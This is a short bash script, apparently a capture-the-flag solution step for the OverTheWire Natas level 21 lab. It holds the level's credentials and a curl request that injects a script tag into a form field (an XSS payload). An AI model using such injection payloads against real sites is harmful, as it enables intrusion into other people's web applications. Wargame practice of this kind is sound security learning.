#!/usr/bin/env bash
curl http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug \
    -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
    -c cookie.txt \
    -d align=left \
    --data-urlencode "fontsize=200%;'><script>alert(1)</script></div><div style=background-color: red" \
    -d bgcolor=green \
    -d submit=Update \
    #-b PHPSESSID=eb03n2rnj862ks1jb29429hu50 \
